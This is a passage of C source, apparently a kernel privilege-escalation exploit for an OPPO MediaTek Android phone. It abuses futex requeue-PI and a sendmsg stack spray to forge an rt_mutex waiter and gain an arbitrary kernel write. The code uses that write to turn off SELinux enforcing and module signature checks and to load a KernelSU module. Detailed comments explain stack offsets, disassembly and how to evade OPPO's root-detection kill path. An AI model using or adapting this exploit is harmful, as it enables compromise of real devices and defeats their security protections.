                chmod("/data/adb/ksu/.allowlist", 0644);
                chown("/data/adb/ksu/.allowlist", 0, 0);
                dprintf(lf, "putal: wrote %ld bytes errno=%d\n", total, errno);
            } else {
                dprintf(lf, "putal: dst open fail errno=%d\n", errno);
            }
            close(in);
        }
    }
    /* sig_enforce 现状 */
    {
        int f = open("/sys/module/module/parameters/sig_enforce", O_RDONLY);
        char b[8] = { 0 };
        if (f >= 0) {
            if (read(f, b, 4) > 0)
                dprintf(lf, "sig_enforce=%s", b);
            close(f);
        }
    }

    src = open("/sdcard/Download/ksu_raw.ko", O_RDONLY);
    if (src < 0) {
        dprintf(lf, "open ko failed errno=%d\n", errno);
        goto out;
    }
    if (fstat(src, &st) != 0 || st.st_size <= 0) {
        dprintf(lf, "fstat failed errno=%d\n", errno);
        close(src);
        goto out;
    }
    dprintf(lf, "ko size=%ld\n", (long)st.st_size);
    ko = (char *)malloc((size_t)st.st_size);
    if (!ko) {
        close(src);
        goto out;
    }
    rd = read(src, ko, (size_t)st.st_size);
    close(src);
    if (rd != (ssize_t)st.st_size) {
        dprintf(lf, "read ko short %ld\n", (long)rd);
        free(ko);
        goto out;
    }

    dprintf(lf, "slide=0x%lx\n", g_slide);

    /* KSU 3.3.1：不再打符号补丁，直接通过模块参数把 kallsyms_lookup_name
     * 的运行时地址传进去（kln=0x...），模块其余符号全靠它自己解析。
     * level=3 = late-load 模式（模块在系统起来之后才装载）。 */
    {
        char param[80];
        snprintf(param, sizeof(param), "kln=0x%lx level=3",
                 (unsigned long)(0xffffff800833745cUL + g_slide));
        dprintf(lf, "init param: %s\n", param);
        errno = 0;
        rc = syscall(__NR_init_module, ko, (unsigned long)st.st_size, param);
        dprintf(lf, "init_module rc=%ld errno=%d\n", rc, errno);
        if (rc != 0)
            dump_kmsg(lf, 30);
    }
    if (rc == 0) {
        /* 触发 allowlist 载入 */
        syscall(__NR_prctl, 0xDEADBEEFUL, 7UL, 1UL, 0UL, 0UL);
        dprintf(lf, "post_fs_data event sent\n");

        /* ★★★ 软重启：只重启 Android 框架，内核不重启 ★★★
         * 杀 system_server ⇒ zygote 退出 ⇒ init 重建框架.
         * 内核模块 kernelsu 与全部 kprobe 原样保留，
         * 而 OPPO 安全中心的检测状态被清零、ksud 重新握手。 */
        sync();
        fsync(lf);
        /* PJU110: 软重启已不需要 —— oplus_root_check 击杀链已在
         * 模块 init 里直接改掉（见 ksu.c ksu_patch_oplus_root_check）。 */
    }

    /* 注意：这里原本有一段「越狱后 setenforce(1) 恢复严格模式」的实验逻辑，
     * 已按要求删除。原因：全局 enforcing 后 su 进程不在 ksu 域里（策略无
     * u:r:ksu:s0），ksud 起来即死 → Manager 报「获取Root失败」；
     * 而全局 permissive 又会让 status page 与内核状态不一致，
     * 造成部分系统服务（含网络）异常。正确解法是重放策略、给 ksu 域
     * 独立的 permissive（magiskpolicy --live），而不是切全局 enforce。 */
    free(ko);
out:
    dprintf(lf, "===== done =====\n");
    fsync(lf);
    if (lf != 2)
        close(lf);
}
static volatile unsigned long g_task_self  = 0; /* th_waiter 线程泄漏到的 task_struct */
static volatile unsigned long g_task_other = 0; /* 子进程主线程泄漏到的（对照组） */
static volatile int g_leak_self_ok = 0, g_leak_other_ok = 0;

/* 运行时地址（main 开头 perf 泄露 slide 后动态填充） */
static unsigned long g_slide = 0;
static unsigned long g_selinux_state_rt = 0;   /* selinux_state 运行时 */
static unsigned long g_selinux_enf_rt = 0;     /* selinux_state + 1 (enforcing) */
static unsigned long g_empty_zero_rt = 0;      /* empty_zero_page 运行时 */
static unsigned long g_scr_rt = 0;             /* BSS_SCRATCH 运行时（伪造对象载体） */
static unsigned long g_init_task_rt = 0;       /* init_task 运行时 */
static unsigned long g_sig_enf_rt = 0;         /* sig_enforce 运行时（v79i 新增） */
/* ★ v81：两个调试解锁目标的运行时地址 */
static unsigned long g_kptr_rt = 0;            /* kptr_restrict 运行时 */
static unsigned long g_panic_oops_rt = 0;      /* panic_on_oops 运行时 */
static unsigned long g_fake_lock = 0;          /* 伪造 rt_mutex 地址（全零、永不被内核加锁的 BSS） */

/* ★★★ v79i：写入目标可配置 ★★★
 *   v78i 之前 th_waiter 里把目标写死成 g_selinux_state_rt+1。
 *   现在需要"先关 SELinux，再关模块签名"两个目标，且都必须走
 *   value = bm_pmd+0x800（byte0=0x00 的不污染 rb_root 分支）。
 *   做法：用 g_target_rt 保存当前目标，th_waiter 两轮之间切换。
 *   两个目标都是"写 0x00 到某地址的第 0 字节"，语义完全同构，
 *   所以同一套喷射布局可以复用。 */
static volatile unsigned long g_target_rt = 0;   /* 当前要清零的地址 */
static volatile int   g_stage_ready = 0;         /* 已废弃（v80i 单轮，保留声明） */

/* ★★★ v80i：fake_lock 槽位选择 ★★★
 *
 * 为什么 slot 必须【每次运行都换一个】：
 *   g_fake_lock 指向内核全局地址 bm_pmd+slot，它是【跨进程共享】的。
 *   一次运行结束后，该 slot 会被写脏：
 *     +0x00 wait_lock         = 0        （解锁时 stlrb 写回，干净）
 *     +0x08 waiters.rb_root   = &waiter  （0x81d4 或 enqueue 留下）
 *     +0x10 waiters.rb_leftmost = &waiter（rb_insert_color_cached 写的）
 *   下一次运行若复用同一 slot，rt_mutex_enqueue 的 `while (*link)` 会
 *   把 &waiter 当真实节点解引用 —— 那是上一个进程已退出的内核栈，
 *   要么是垃圾要么已释放 ⇒ 遍历崩溃（正是 v76i +0x248 的同一模式）。
 *
 *   实测证据：v79i 崩溃现场 x22 = bm_pmd+0x40（lock1），x8 = *(lock1+0x10)
 *   为陈旧非零值，rt_mutex_top_waiter 取出假 w ⇒ BUG_ON(w->lock != lock)。
 *
 * 分工（每个 slot 在一台机器上自开机起只允许用一次）：
 *   第 1 次运行（selinux）→ slot = SCR_LOCK1 (0x40)
 *   第 2 次运行（sig）    → slot = SCR_LOCK2 (0xC0)
 * 想再跑第三次就得重启（或用本文件里下一个未用过的零偏移）。
 * 该地址属于内核 .bss，重启后重新归零，因此"重启即失效"语义不变。 */
static unsigned long g_slot = 0;

/* futex words index */
#define F_CHAIN  0
#define F_TARGET 1
#define F_WAIT   2

/* ── 目标写入 ── */
/* selinux_state 静态 0xffffff800b1b8bd8, enforcing 在 +1 */
/* 两步整形写：
 *   A 步: target=SELINUX_STATE_RT+8 (policycap 指针槽), value=Q_ADDR (0x10003000)
 *         → 把 selinux_state+8 (policycap 首字段) 写掉, 指向用户 Q 页, 后续垃圾落 Q 页不崩
 *   B 步: target=selinux_enforcing (enforcing),       value=empty_zero+0x100
 *         → enforcing=0 ⇒ Permissive (A 步后 policycap 已指 Q, 不会污染内核) */
static unsigned long g_target = 0;      /* main 里按 argv 动态赋值 */
static unsigned long g_value  = 0;      /* main 里按 argv 动态赋值 */
/* A_STEP_VALUE 已移除：A 步 value 改用内核地址 empty_zero+0x100（PAN-safe） */

/* ── 全局状态 ── */
static unsigned       *F;                       /* futex words, 指向共享页 */
static volatile pid_t g_waiter_tid = 0;         /* th_waiter 的 TID：rt_mutex_adjust_pi 的目标 */
static volatile int   g_probe_done = 0;         /* th_probe 已完成触发序列 */
static volatile int   g_dbg_f1_after_stamp = 0; /* do_stamp 后 th_waiter 读到的 F_TARGET 快照 */
static volatile long  g_dbg_stamp_us = 0;       /* do_stamp 完成时刻（单调时钟，微秒） */
static volatile long  g_dbg_probe_us = 0;       /* th_probe 触发时刻（单调时钟，微秒） */
static volatile int   g_sprayed = 0, g_stamped = 0;
static int            sv[2] = {-1, -1};
static volatile int   w_held = 0, w_waiting = 0, o_armed = 0, o_done = 0;
static volatile long  w_wait_ret = -999, w_wait_err = -999; /* 诊断: th_waiter 返回 (哨兵 -999=未返回) */
static volatile long  w_wait_sec = 0, w_wait_nsec = 0;     /* 诊断: th_waiter ts 值 */
static volatile long  o_lock_ret = 0, o_lock_err = 0;      /* 诊断: th_owner LOCK F_CHAIN */
static volatile long  o_unlock_ret = 0, o_unlock_err = 0;  /* 诊断: th_owner UNLOCK */
    static volatile long  stamp_enter = -999, stamp_exit = -999; /* 诊断: do_stamp 进入/退出 */
    static volatile long  snd_ret = -999;                        /* 诊断: sendmsg 返回值 */
    static int            g_enf_before = -1;                     /* 诊断: 开跑前 enforce */
    static double         g_up;
    static int            g_mfd = -1;

    /* ── sendmsg 双通道喷射（反汇编实测偏移，PAN 命中版同款）──
     *   通道1 iovstack(s_iov)：___sys_sendmsg 栈帧 sp+0x38 = waiter-0x50
     *     → s_iov[5]=waiter+0x00(树), s_iov[6]=+0x10, s_iov[7]=+0x20
     *   通道2 msg_name(s_name)：___sys_sendmsg 栈帧 sp+0xb8 = waiter+0x30
     *     → name[0]=task(+0x30), name[1]=lock(+0x38), +0x10=prio(+0x40) */
    static struct iovec    s_iov[8];
    static struct msghdr   s_msg;
    static unsigned char   s_name[0x40] __attribute__((aligned(8)));

/* ── v82 前向声明 ──
 * leak_task_in_thread 定义在文件末尾，但 child_body / th_waiter 需要调用，
 * 故在此先声明，避免隐式声明（-Werror 下会直接编译失败）。 */
static unsigned long leak_task_in_thread(unsigned long cc_rt, int *out_hits);
static unsigned long leak_task_retry(unsigned long cc_rt, const char *tag);


/* ── 辅助 ── */
static const char *en(int e) {
    switch (e) {
        case 0:   return "OK";
        case 110: return "ETIMEDOUT";
        case 35:  return "EDEADLK";
        default:  return "?";
    }
}

static long fx(unsigned *u, int op, unsigned val,
               const void *a4, unsigned *u2, unsigned v3) {
    errno = 0;
    return syscall(__NR_futex, u, op, val, a4, u2, v3);
}

/* ── 信号强杀：打断 WAIT_REQUEUE_PI ── */
/* 关键：不能用 signal()（glibc 默认 SA_RESTART，futex 会自启、永不返回 EINTR）。
 * 必须用 sigaction 且【不设 SA_RESTART】，让 futex 被信号打断后返回 -EINTR。 */
static void sigusr1_handler(int sig) { (void)sig; }

static void install_sigusr1(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigusr1_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;              /* ★ 不设 SA_RESTART */
    sigaction(SIGUSR1, &sa, NULL);
}

/* ── build_fakes (构造假 rt_mutex_waiter + 配套 rb_node 树节点) ── */
static void build_fakes(void) {
    unsigned long *t = (unsigned long*)T_ADDR;
    unsigned long *p = (unsigned long*)P_ADDR;
    unsigned long *q = (unsigned long*)Q_ADDR;
    unsigned long *r = (unsigned long*)R_ADDR;

    memset((void*)T_ADDR, 0, 0x1000);
    memset((void*)P_ADDR, 0, 0x1000);
    memset((void*)Q_ADDR, 0, 0x1000);
    memset((void*)R_ADDR, 0, 0x1000);

    /* T: 锁页 (rt_mutex 模拟) */
    t[0] = 0;                          /* wait_lock */
    t[1] = 0;                          /* waiters.rb_root */
    t[2] = (unsigned long)P_ADDR;      /* waiters.rb_leftmost → P */
    t[3] = 0;                          /* owner = NULL */

    /* P: 左子节点 (用户假 rb_node)
     * P+0x00 = 1 (BLACK) → rb_insert_color 直接 ret
     * P+0x08 = rb_right = 0
     * P+0x10 = rb_left = 0
     * P+0x38 = T (leftmost 检查) */
    p[0] = 1;                          /* __rb_parent_color = BLACK */
    p[1] = 0;                          /* rb_right */
    p[7] = (unsigned long)T_ADDR;      /* P+0x38 = lock (fake) */
    p[8] = 119;                        /* P+0x40 prio */

    /* Q: 右子节点 */
    q[0] = 1;
    q[5] = 2;
    q[8] = 0x1000;

    /* R: 观察页 (rb_erase 写入目标) */
    r[0] = 0x4141414141414141UL;       /* 写入前哨兵 */
    r[1] = 0;
    r[2] = (unsigned long)P_ADDR;
    r[8] = 0x1000;
}

/*
 * do_stamp — 同线程 syscall 栈喷射（sendmsg 双通道）
 *
 * 时机：在 futex(F_WAIT, FUTEX_WAIT_REQUEUE_PI) 返回之后由【同一线程】调用，
 *       因为 rt_waiter 就在本线程内核栈的固定位置 T-0x198。
 *
 * 通道 1（iovstack，UIO_FASTIOV=8）：
 *   s_iov[5].iov_base → waiter+0x00  tree_entry.__rb_parent_color = value
 *   s_iov[5].iov_len  → waiter+0x08  tree_entry.rb_right          = 0
 *   s_iov[6].iov_base → waiter+0x10  tree_entry.rb_left           = target
 *   s_iov[6].iov_len  → waiter+0x18  pi_tree.__rb_parent_color    = 0
 *   s_iov[7].iov_base → waiter+0x20  pi_tree.rb_right             = 0
 *   s_iov[7].iov_len  → waiter+0x28  pi_tree.rb_left              = 0
 *
 * 通道 2（msg_name → move_addr_to_kernel → ___sys_sendmsg 局部 address[]）：
 *   s_name[0x00] (name[0]) → waiter+0x30  task   = fake_lock（全零假 task）
 *   s_name[0x08] (name[1]) → waiter+0x38  lock   = fake_lock（全零假 rt_mutex）
 *   s_name[0x10] (name[2]) → waiter+0x40  prio   = 0x7fffffff
 *
 * ★ 为什么 fake_lock 必须每轮全新：
 *   写完 target 之后 rtmutex.c:689 rt_mutex_enqueue 会以
 *   lock->waiters.rb_root.rb_node 为根继续插树。上一轮的 str x8,[x1]
 *   已把该槽写成 target，若复用，实写轮会把 selinux_state 当 rb_node 遍历。
 */

/* ── 单调时钟微秒（纯时间戳，用于对齐 do_stamp 与触发时刻）── */
static long now_us(void) {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (long)t.tv_sec * 1000000L + t.tv_nsec / 1000L;
}

/* ══════════════════════════════════════════════════════════════════════════
 * ★★★ v82b：纯 EL0 自旋延时 —— cred 分支的生死线 ★★★
 *
 * 为什么不能用 usleep()/nanosleep()：
 *   OPPO 的 oplus_invoke_syscall 在【syscall 入口】快照 cred->uid/euid/fsuid，
 *   在【出口】重读并 cmp。若出口 uid < 入口 uid ⇒ 判定"进程在本次 syscall
 *   期间被提权"⇒ oplus_root_check_succ + kevent_send_to_user（弹那个
 *   "检测到有恶意程序尝试破坏手机系统"）+ do_group_exit(9)（杀整个进程组）。
 *
 *   实测反汇编（0xffffff800825a210）：
 *     +0x2c  ldr w20,[x8,#4]     ; 入口 uid 快照
 *     +0xf0  ldr w9,[x8,#4]      ; 出口重读
 *     +0xf4  cmp w9,w20
 *     +0xf8  b.cc  +0x12c        ; 变小 ⇒ BLOCK
 *   免检三通道：① 入口 uid==0（cbz w20）；② is_unlocked()；③ jump table 值 0。
 *   实测 sub w8,w21,#0x8f / cmp #0x47 / b.hi ⇒ nr<143 或 nr>214 全部走完整检测，
 *   nanosleep(101) 与 write(64) 都在检测范围内。
 *
 *   ⇒ 若主线程在 usleep(100000) 中休眠时 cred 被改写，醒来时出口 uid=0 < 入口 2000
 *     ⇒ 立刻被杀。这就是 cred 分支连 "probe_done" 那行都打不出来的原因。
 *
 * 解法：等待改成读 cntvct_el0 的纯用户态自旋，全程不发任何 syscall。
 *   这样写入时刻主线程根本没有"入口快照"；等它下次真正调 printf/syscall 时，
 *   入口 uid 已经是 0，cbz w20 直接跳过检测 ⇒ 天然免检。
 *
 * 代价：占用一个核心 100% 若干秒。MT6833 八核，且这是短窗口，可接受。
 * ══════════════════════════════════════════════════════════════════════════ */
static void spin_ms(long ms) {
    unsigned long freq, t0, t1;
    __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(freq));
    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(t0));
    if (!freq) {                   /* 理论上不会发生；兜底 */
        for (volatile long i = 0; i < ms * 20000L; i++) { }
        return;
    }
    unsigned long need = (freq / 1000UL) * (unsigned long)ms;
    do {
        __asm__ volatile("mrs %0, cntvct_el0" : "=r"(t1));
        __asm__ volatile("yield" ::: "memory");   /* 让出流水线，仍是 EL0 */
    } while ((t1 - t0) < need);
}

static void do_stamp(unsigned long target, unsigned long value,
                     unsigned long fake_lock) {
    unsigned long *name = (unsigned long *)s_name;
    int i;

    __atomic_store_n(&stamp_enter, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&stamp_exit, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&snd_ret, -999, __ATOMIC_RELEASE);

    /* ══════════════════════════════════════════════════════════════════
     * v76i：反汇编【实测】栈几何（T = 本线程进入 syscall 时的栈顶 sp）
     *
     *   __arm64_sys_sendmsg  sub sp,#0x90            → sp = T-0x090
     *   ___sys_sendmsg       sub sp,#0x190           → sp = T-0x220
     *                        add x29,sp,#0x140       → x29 = T-0x0e0
     *                        add x9, sp, #0x38       → iovstack = T-0x1e8
     *                        sub x10,x29,#0x88       → address  = T-0x168
     *
     *   __arm64_sys_futex    sub sp,#0x70            → sp = T-0x070
     *   do_futex             stp x29,x30,[sp,#-96]!  → x29 = T-0x0d0
     *                        sub x2, x29, #0xc8      → &rt_waiter = T-0x198
     *
     * ⇒ iovstack[5] = T-0x1e8 + 0x50 = T-0x198 = waiter+0x00   ★精确命中
     * ⇒ address     = T-0x168              = waiter+0x30
     *
     * 两条通道互补、不重叠：
     *   iovstack[5].iov_base → waiter+0x00 tree_entry.__rb_parent_color = value
     *   iovstack[5].iov_len  → waiter+0x08 tree_entry.rb_right          = 0
     *   iovstack[6].iov_base → waiter+0x10 tree_entry.rb_left           = target
     *   iovstack[6].iov_len  → waiter+0x18 pi_tree.__rb_parent_color    = 0
     *   iovstack[7].iov_base → waiter+0x20 pi_tree.rb_right             = 0
     *   iovstack[7].iov_len  → waiter+0x28 pi_tree.rb_left              = 0
     *   address[0] (name[0]) → waiter+0x30 task
     *   address[1] (name[1]) → waiter+0x38 lock
     *   address[2] (name[2]) → waiter+0x40 prio （低 4 字节）
     *
     * rb_erase_cached（0xffffff80095d7f4c）逐条核对：
     *   ldp  x9,x8,[x0,#8]   x9=rb_right(0)  x8=rb_left(target)
     *   cbz  x8 → 0x8078     target≠0 ⇒ 不跳
     *   cbz  x9 → 0x7fc4     x9=0     ⇒ 跳
     * 0x7fc4:
     *   ldr  x10,[x0]        x10 = __rb_parent_color = value
     *   ands x9,x10,#~3      value∈{0..3} ⇒ Z=1
     *   str  x10,[x8]        ★★★ *(target) = value  ← 任意写成立
     *   b.eq 0x81d4 → str x8,[x1] → ret   （写 fake lock->waiters.rb_node）
     *
     * ★ fake_lock 必须是【每轮全新、全零】的一页内区域：
     *   第 689 行 rt_mutex_enqueue(lock, waiter) 会以 lock->waiters.rb_root.rb_node
     *   为根继续插树。上一轮 str x8,[x1] 已把它写成 target，若复用同一 fake_lock，
     *   实写轮就会把 selinux_state 当成 rb_node 去遍历（解引用 selinux_state+0x40
     *   以及可能的 avc 指针），有污染/崩溃风险。
     *   探针轮用 EZ+0x800，实写轮用 EZ+0xC00，两者都全零 ⇒ enqueue 走
     *   parent=NULL 的 rb_link_node 分支，只写 fake_lock 内部，绝对安全。
     * ══════════════════════════════════════════════════════════════════ */
    for (i = 0; i < 8; i++) {
        s_iov[i].iov_base = NULL;
        s_iov[i].iov_len  = 0;
    }

    /* ★★ 反汇编核算的真实落点（T = 本 syscall 刚进入时的 sp）★★
     *   __arm64_sys_sendmsg  sub sp,#0x90       → sp = T-0x90
     *   ___sys_sendmsg       sub sp,#0x190      → sp = T-0x220
     *                        add x29,sp,#0x140   → x29 = T-0xe0
     *                        add x9,sp,#0x38     → iovstack = T-0x1e8
     *                        add x9,sp,#0x10 / add x4,x9,#0x10
     *                        sub x10,x29,#0x88   → address  = T-0x168（msg_name 落点）
     *   __arm64_sys_futex    sub sp,#0x70       → sp = T-0x70
     *   do_futex             stp x29,x30,[sp,#-96]! → x29 = T-0xd0
     *                        sub x2,x29,#0xc8    → &rt_waiter = T-0x198
     *   ⇒ iovstack[5] = T-0x198 = waiter+0x00        （iov 每项 16B，5*16=0x50）
     *   ⇒ address     = T-0x168 = waiter+0x30        （0x30 恰好落在 task 字段）
     * 两条通道互补、不重叠：树三字段走 iovstack，task/lock/prio 走 msg_name。 */
    s_iov[5].iov_base = (void *)value;      /* waiter+0x00 __rb_parent_color = value */
    s_iov[5].iov_len  = 0;                  /* waiter+0x08 tree_entry.rb_right = 0     */
    s_iov[6].iov_base = (void *)target;     /* waiter+0x10 tree_entry.rb_left = target */
    s_iov[6].iov_len  = 0;                  /* waiter+0x18 pi_tree.__rb_parent_color=0 */
    s_iov[7].iov_base = NULL;               /* waiter+0x20 pi_tree.rb_right = 0        */
    s_iov[7].iov_len  = 0;                  /* waiter+0x28 pi_tree.rb_left  = 0        */

    memset(s_name, 0, sizeof(s_name));
    /* ★ task 必须是【真实内核地址】：chain walk 走到 owner==NULL 分支时会
     *   wake_up_process(rt_mutex_top_waiter(lock)->task)，
     *   若此处填用户地址 Q_ADDR，PAN 下解引用直接 Panic。
     *   g_init_task_rt 是 init_task（swapper），wake 它是安全的空操作。 */
    /* ★ v77i：task 用【fake_lock 本身】= bm_pmd 里的一段全零区，即假 task_struct。
     *   为什么绕行之后 708 行会真的调用 wake_up_process：
     *     绕行分支让 rb_root 保持 0 ⇒ rt_mutex_enqueue 走
     *     rb_link_node(parent=NULL) + rb_insert_color_cached(leftmost=true)，
     *     leftmost=true 会执行 `str x0,[x1,#8]` 把 lock->waiters.rb_leftmost
     *     写成 &waiter->tree_entry ⇒ rt_mutex_top_waiter(lock) 非 NULL
     *     ⇒ 与 prerequeue_top_waiter(NULL) 不等 ⇒ 708 行调用
     *     wake_up_process(waiter->task)。
     *
     *   全零假 task 是安全的，try_to_wake_up 会立即早退（反汇编实测）：
     *     0x82a05d8 add  x19,x0,#0x84c        ; &p->pi_lock
     *     0x82a05f4 bl   _raw_spin_lock_irqsave ; 对全零 raw_spinlock：0→1 成功
     *     0x82a05fc ldr  x8,[x22,#32]          ; p->state = 0
     *     0x82a0608 tst  x8,x9                 ; 0 & TASK_NORMAL(3) = 0 ⇒ Z=1
     *     0x82a060c b.eq 0x82a06c4             ; ★立即早退
     *     0x82a06c4 mov  w20,wzr / b 0x82a0b48
     *     0x82a0b48 bl   _raw_spin_unlock_irqrestore ; 解锁配对
     *     0x82a0b68 mov  w0,w20                ; 返回 0
     *   ⇒ 绝不进入 ttwu_do_activate，不会解引用 p->sched_class。
     *   （此处必须用全零假 task 而【不是】init_task：4.19 空闲线程的
     *     state 在 do_idle 里被置成 TASK_IDLE(=0x402)，
     *     `0x402 & TASK_NORMAL` = 2 ≠ 0 ⇒ 早退条件不成立，
     *     会真的去 activate swapper，风险不可控。）
     *   零页假 task 的字段全在 bm_pmd 同一页内：state +0x20、
     *   pi_lock +0x84c —— 0x84C < 0x1000，不越页。 */
    name[0] = fake_lock;                     /* waiter+0x30 task = 全零假 task */
    name[1] = fake_lock;                     /* waiter+0x38 lock = 全零假 rt_mutex */
    *(int *)(s_name + 0x10) = 0x7fffffff;    /* waiter+0x40 prio ≠ 120 ⇒ 573 判不等 */

    memset(&s_msg, 0, sizeof(s_msg));
    s_msg.msg_name    = s_name;
    s_msg.msg_namelen = 0x20;               /* 覆盖 address[0..0x1f] = waiter+0x30..+0x4f */
    s_msg.msg_iov     = s_iov;
    s_msg.msg_iovlen  = 8;

    errno = 0;
    snd_ret = syscall(__NR_sendmsg, sv[0], &s_msg, 0);
    __atomic_store_n(&stamp_exit, 1, __ATOMIC_RELEASE);
}

/* ── trace_marker：把用户态事件打进 ftrace 时间轴 ──
 * /sys/kernel/tracing/trace_marker 权限 --w--w--w-，shell 可直接写。
 * 与 sched_pi_setprio / sched_process_exit 共存于同一 buffer，
 * 因此用户态节点和内核事件可直接按时间戳对齐。 */
static int g_tm_fd = -1;

static void tmarkf(const char *fmt, ...) {
    char b[160];
    va_list ap;
    int n;
    if (g_tm_fd < 0) return;
    va_start(ap, fmt);
    n = vsnprintf(b, sizeof(b), fmt, ap);
    va_end(ap);
    if (n > 0) {
        ssize_t w = write(g_tm_fd, b, (size_t)n);
        (void)w;
    }
}

/* ── 三线程 ── */

/* th_waiter: 拿到 F_CHAIN 锁, 在 F_WAIT 上阻塞等待 requeue */
static void *th_waiter(void *a) {
    long r;

    /* ★ 线程名会出现在 sched_pi_setprio 的 comm= 字段里，用于识别是谁被 boost */
    pthread_setname_np(pthread_self(), "gl_wait");
    /* ★ v75i：记录本线程 TID。th_probe 之后用 sched_setparam(g_waiter_tid)
     *   触发 sched/core.c:5473 的 rt_mutex_adjust_pi(th_waiter)。
     *   gettid 是 syscall，但此刻尚未 do_stamp，栈还没被喷射 ⇒ 无害。
     *   ⚠️ 绝不能挪到 do_stamp() 之后 —— 那个 syscall 会覆盖喷射数据。 */
    g_waiter_tid = (pid_t)syscall(__NR_gettid);
    tmarkf("GL W:in tid=%d", (int)g_waiter_tid);

    /* ★ 不安装 SIGUSR1 处理器。
     * 原因：SIGUSR1 会打断 futex 等待，使其返回 -EINTR 走 cleanup 分支；
     * 而本链路依赖的是 th_owner 早让位造成的【早唤醒】路径（handle_early_requeue_pi_wakeup
     * 返回非 0 → goto out_put_keys 绕过 cleanup），让 pi_blocked_on 悬空保留。
     * 装信号只会多引入一条会把 waiter 清掉的路径。 */

    /* 1) LOCK_PI F_CHAIN → waiter 入队 */
    r = fx(&F[F_CHAIN], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (r) {
        w_held = -1;
        return NULL;
    }
    w_held = 1;

    /* 2) WAIT_REQUEUE_PI F_WAIT
     * ★ 历史注记：早期用 /proc/uptime（boottime）作超时基准：
     *     ts.tv_sec  = (long)g_up + 3;
     *     ts.tv_nsec = (long)((g_up - (double)(long)g_up) * 1e9);
     *   我们之前改成 CLOCK_MONOTONIC 是为了让"3s 超时确实会触发"，
     *   但那个修复本身遮蔽了真正的问题：th_waiter 本来就不该走到超时分支，
     *   它应该被 th_owner 早让位提前唤醒（见 th_owner 注释）。
     *   该写法仅作历史记录，最终实现见下段（v74i 改用 CLOCK_MONOTONIC）。 */
    /* ★★ v74i 修正 v73i 的致命 bug ★★
     * v73i 用 g_up(/proc/uptime = CLOCK_BOOTTIME) 作超时基准，但 PJU110 上
     *   g_up=34237.3 而 CLOCK_MONOTONIC=34126.0，相差 111 秒（suspend 累积）。
     * futex_wait_requeue_pi (futex.c:3394) 的 hrtimer 基是
     *   (flags & FLAGS_CLOCKRT) ? CLOCK_REALTIME : CLOCK_MONOTONIC
     * 我们没传 FLAGS_CLOCKRT ⇒ 内核按 MONOTONIC 解释这个绝对值。
     * 于是 g_up+3 实际落在 monotonic 轴 111 秒之后 ⇒ th_waiter 永不返回
     * ⇒ do_stamp 永不执行 ⇒ 父进程 8 秒就 SIGKILL。v73i 的 trace 正是
     * 停在 GL O:chain 之后没有 GL W:wake / GL W:stamped，铁证。
     * 结论：超时必须用 CLOCK_MONOTONIC（v71i 是对的，v73i 是我改错的）。 */
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 3;
    ts.tv_nsec += 0;

    /* 标记即将进入 F_WAIT 阻塞, 通知 th_owner 可以开始抢锁
     * ⚠️ 必须在 WAIT_REQUEUE_PI 之前设置, 否则 th_owner 会等
     *    waiter 超时返回后才动作, 死锁环就散了 */
    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);
    w_wait_sec = ts.tv_sec; w_wait_nsec = ts.tv_nsec;

    r = fx(&F[F_WAIT], FUTEX_WAIT_REQUEUE_PI, 1, &ts, &F[F_TARGET], 0);
    w_wait_ret = r; w_wait_err = errno;
    /* ★ 这一行的 errno 是判定走哪条分支的关键：
     *   e=110 (ETIMEDOUT)   → rt_mutex_wait_proxy_lock 超时 → cleanup_proxy_lock
     *                         → remove_waiter → pi_blocked_on=NULL ⇒ 后续必 Miss
     *   e=11  (EWOULDBLOCK) → handle_early_requeue_pi_wakeup 早唤醒
     *                         → goto out_put_keys，绕过 cleanup ⇒ pi_blocked_on 保留 ✅
     *   e=4   (EINTR)       → 信号打断，同样进 cleanup 分支（本实现无信号，不会出现） */
    tmarkf("GL W:wake r=%ld e=%d", r, errno);

    /* ★★★ 决定性修正：do_stamp 必须是本线程【最后一次系统调用】★★★
     *
     * 之前 v71i/v72i/v73i 的致命顺序错误：
     *     do_stamp();                          ← 把伪造 waiter 打进内核栈
     *     tmarkf("GL W:stamped ...");           ← write() 系统调用!!!
     *     for (;;) __asm__("yield");            ← 纯用户态指令，无害
     * tmarkf 内部是 write(trace_marker_fd)，write 的内核路径
     * （__arm64_sys_write → ksys_write → vfs_write，栈深 ~0x150）
     * 与 futex 的 do_futex 帧完全重叠 —— 它把刚喷好的
     * waiter+0x00..+0x2f（tree_entry 三字段）当场覆盖成 write 的局部变量。
     * 所以 v71i 的 trace 里明明有 GL W:stamped，实测却 Miss：
     * 打印这一行本身就是抹掉证据的动作。
     *
     * 因此顺序必须是：
     *   1) tmarkf("GL W:wake")   ← 喷射前打点，无害
     *   2) do_stamp()            ← 喷射（sendmsg 的内核栈帧与 futex 同深）
     *   3) 纯用户态原子写 g_stamped（不发任何 syscall）
     *   4) 纯用户态自旋（asm yield 是 CPU 提示指令，不进内核）
     * 喷射完成后本线程不得再进入内核态，否则栈被自己踩掉。 */
    /* ══════════════════════════════════════════════════════════════════
     * v77i 核心修正：绕开 rt_mutex_enqueue 的遍历崩溃
     *
     * ── v76i 崩溃的完整因果（Oops: rt_mutex_adjust_prio_chain+0x248）──
     *   rb_erase_cached @ 0x7f4c 走 x8=rb_left=target、x9=rb_right=0 分支：
     *     0x7fc4 ldr  x10,[x0]        x10 = node->__rb_parent_color = value
     *     0x7fc8 ands x9,x10,#~3      x9 = value & ~3
     *     0x7fcc str  x10,[x8]        ★*(target) = value  写已成功
     *     0x7fd0 b.eq 0x81d4          value&~3==0 ⇒ Z=1 ⇒ 跳
     *     0x81d4 str  x8,[x1]         ★*(fake_lock+0x08) = target  ← 埋雷
     *   随后 rtmutex.c:689 rt_mutex_enqueue 以 target 为树根遍历：
     *     parent = target(=selinux_state)；entry->prio = *(target+0x40) = 0
     *     120 < 0 为假 ⇒ link = target+0x08，leftmost=false
     *     *(target+0x08) = 0x01010100（policycap）≠ 0 ⇒ 第二次迭代
